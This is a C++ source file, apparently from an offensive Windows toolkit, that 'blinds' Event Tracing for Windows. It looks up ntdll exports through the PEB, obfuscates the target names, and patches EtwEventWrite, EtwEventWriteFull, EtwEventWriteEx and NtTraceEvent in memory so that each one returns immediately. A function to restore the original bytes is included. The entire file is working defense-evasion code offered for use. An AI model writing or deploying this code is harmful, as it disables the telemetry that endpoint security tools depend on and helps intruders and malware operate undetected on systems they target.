#include "real/win/etw_blind.hpp"
#include "real/platform.hpp"

#if LR_PLATFORM_WINDOWS && LR_ARCH_X64

#include "real/win/api_table.hpp"
#include "real/win/eat_util.hpp"
#include "real/win/peb_util.hpp"
#include "real/win/windows_h.hpp"
#include "real/win/xorstr.hpp"

#include <cstring>

namespace real::win {
namespace {

struct PatchSlot {
  void* address = nullptr;
  std::uint8_t saved[8]{};
  std::uint8_t patch_len = 0;
  bool active = false;
};

static constexpr int kMaxTargets = 4;
static PatchSlot s_slots[kMaxTargets];
static int s_slot_count = 0;
static bool s_active = false;

// xor eax, eax; ret  — returns 0 (STATUS_SUCCESS / FALSE-ish)
static const std::uint8_t kBlindPatch[] = {0x33, 0xC0, 0xC3};

bool protect_rwx(void* addr, std::size_t len, DWORD* old_out) {
  auto& api = g_Api();
  api.ensure_resolved();
  if (api.NtProtectVirtualMemory) {
    PVOID base = addr;
    SIZE_T region = len;
    ULONG old = 0;
    HANDLE self = reinterpret_cast<HANDLE>(static_cast<intptr_t>(-1));
    NTSTATUS st =
        api.NtProtectVirtualMemory(self, &base, &region, PAGE_EXECUTE_READWRITE, &old);
    if (st >= 0) {
      *old_out = old;
      return true;
    }
  }
  DWORD old = 0;
  if (!::VirtualProtect(addr, len, PAGE_EXECUTE_READWRITE, &old)) return false;
  *old_out = old;
  return true;
}

bool protect_restore(void* addr, std::size_t len, DWORD old_prot) {
  auto& api = g_Api();
  if (api.NtProtectVirtualMemory) {
    PVOID base = addr;
    SIZE_T region = len;
    ULONG tmp = 0;
    HANDLE self = reinterpret_cast<HANDLE>(static_cast<intptr_t>(-1));
    if (api.NtProtectVirtualMemory(self, &base, &region, old_prot, &tmp) >= 0) return true;
  }
  DWORD tmp = 0;
  return ::VirtualProtect(addr, len, old_prot, &tmp) != FALSE;
}

void* resolve_ntdll(const char* name) {
  uintptr_t ntdll = peb::find_module("ntdll");
  if (!ntdll) return nullptr;
  return eat::resolve_export(ntdll, name);
}

bool patch_one(const char* name, PatchSlot& slot) {
  void* addr = resolve_ntdll(name);
  if (!addr) return false;
  slot.address = addr;
  std::memcpy(slot.saved, addr, sizeof(kBlindPatch));
  slot.patch_len = static_cast<std::uint8_t>(sizeof(kBlindPatch));

  DWORD old = 0;
  if (!protect_rwx(addr, slot.patch_len, &old)) return false;
  std::memcpy(addr, kBlindPatch, slot.patch_len);
  protect_restore(addr, slot.patch_len, old);
  ::FlushInstructionCache(::GetCurrentProcess(), addr, slot.patch_len);
  slot.active = true;
  return true;
}

bool restore_one(PatchSlot& slot) {
  if (!slot.active || !slot.address) return false;
  DWORD old = 0;
  if (!protect_rwx(slot.address, slot.patch_len, &old)) return false;
  std::memcpy(slot.address, slot.saved, slot.patch_len);
  protect_restore(slot.address, slot.patch_len, old);
  ::FlushInstructionCache(::GetCurrentProcess(), slot.address, slot.patch_len);
  slot.active = false;
  return true;
}

}  // namespace

EtwBlindReport etw_blind_apply() noexcept {
  EtwBlindReport rep{};
  if (s_active) {
    rep.patched = true;
    rep.targets_patched = s_slot_count;
    rep.targets_found = s_slot_count;
    rep.detail = "already active";
    return rep;
  }

  // Clear slots
  s_slot_count = 0;
  for (auto& s : s_slots) s = {};

  const char* targets[] = {
      OBF("EtwEventWrite"),
      OBF("EtwEventWriteFull"),
      OBF("EtwEventWriteEx"),
      OBF("NtTraceEvent"),
  };

  for (const char* t : targets) {
    if (s_slot_count >= kMaxTargets) break;
    ++rep.targets_found;
    if (patch_one(t, s_slots[s_slot_count])) {
      ++s_slot_count;
      ++rep.targets_patched;
    }
  }

  s_active = rep.targets_patched > 0;
  rep.patched = s_active;
  rep.detail = s_active ? "patched" : "no targets resolved";
  return rep;
}

EtwBlindReport etw_blind_restore() noexcept {
  EtwBlindReport rep{};
  int restored = 0;
  for (int i = 0; i < s_slot_count; ++i) {
    if (restore_one(s_slots[i])) ++restored;
  }
  rep.targets_patched = restored;
  rep.targets_found = s_slot_count;
  rep.patched = false;
  s_active = false;
  s_slot_count = 0;
  rep.detail = "restored";
  return rep;
}

bool etw_blind_active() noexcept { return s_active; }

}  // namespace real::win

#else

namespace real::win {
EtwBlindReport etw_blind_apply() noexcept { return {}; }
EtwBlindReport etw_blind_restore() noexcept { return {}; }
bool etw_blind_active() noexcept { return false; }
}  // namespace real::win

#endif
